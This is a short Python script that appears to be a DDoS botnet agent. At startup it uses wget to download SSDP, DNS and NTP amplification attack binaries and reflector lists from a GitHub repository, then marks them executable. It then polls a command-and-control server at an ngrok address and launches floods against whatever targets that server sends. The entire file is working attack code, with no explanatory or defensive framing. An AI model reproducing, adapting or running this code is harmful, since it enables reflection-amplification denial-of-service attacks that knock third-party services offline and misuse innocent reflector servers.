#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from datetime import datetime
from threading import Lock, Thread
import requests
import time
import os

_lock = Lock()
CNC = '4334291e.ngrok.io'
LINKS = [
    'https://github.com/SaxAlien/WebTerror/raw/master/scan/SSDPAMP',
    'https://github.com/SaxAlien/WebTerror/raw/master/scan/DNSAMP',
    'https://github.com/SaxAlien/WebTerror/raw/master/scan/NTPAMP',
    # ===============================================================
    'https://github.com/SaxAlien/WebTerror/raw/master/list/SSDP.txt',
    'https://github.com/SaxAlien/WebTerror/raw/master/list/DNS.txt',
    'https://github.com/SaxAlien/WebTerror/raw/master/list/NTP.txt',
]


def log_event(event, data, is_error=False):
    with _lock:
        pattern = '\x1b[36m'
        if is_error: pattern = '\x1b[91m'
        print('[ \x1b[37m%s\033[0m ] [%s:%s:\033[0m] \t -> \t%s' % (datetime.now(), pattern, event.upper(), data))

def _run(cmd):
    os.system(cmd)

def _process(data):
    if data:
        data = data.split(' ')
        if 'SSDPAMP' in data:
            _crun = './{} {} {} SSDP.txt {} 999999999'.format(data[0], data[1], data[2], data[3].strip())
            Thread(target=_run, args=(_crun,)).start()
        if 'DNSAMP' in data:
            _crun = './{} {} {} DNS.txt {} 999999999'.format(data[0], data[1], data[2], data[3].strip())
            Thread(target=_run, args=(_crun,)).start()
        if 'NTPAMP' in data:
            _crun = './{} {} {} NTP.txt {} 999999999'.format(data[0], data[1], data[2], data[3].strip())
            Thread(target=_run, args=(_crun,)).start()



def loop():
    CMD = ''
    while True:
        try:
            resp = requests.get('http://{}/CNC.txt'.format(CNC))
            if resp.status_code == 200:
                if CMD != resp.text:
                    _process(resp.text)
                    CMD = resp.text
        except Exception as ex:
            pass
        time.sleep(3)


if __name__ == '__main__':
    for link in LINKS:
        os.system('wget {} > /dev/null'.format(link))
    os.system('chmod +x ./*')
    loop()
